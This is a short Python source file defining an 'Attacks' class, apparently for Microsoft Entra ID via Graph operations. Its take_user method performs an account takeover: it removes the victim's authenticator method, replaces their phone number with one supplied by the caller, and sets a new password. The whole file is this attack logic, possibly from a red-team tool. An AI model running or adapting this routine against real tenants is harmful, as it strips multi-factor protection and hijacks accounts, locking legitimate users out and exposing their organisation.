class Attacks:
    def __init__(self, graph_operations):
        self.graph_operations = graph_operations

    def take_user(self, user_id, password, phone_number):
        self.graph_operations.user_operations.delete_authentication_method(user_id, 'authenticator')
        self.graph_operations.user_operations.change_phone_number(user_id, phone_number)
        self.graph_operations.user_operations.set_entra_user_password(user_id, password)
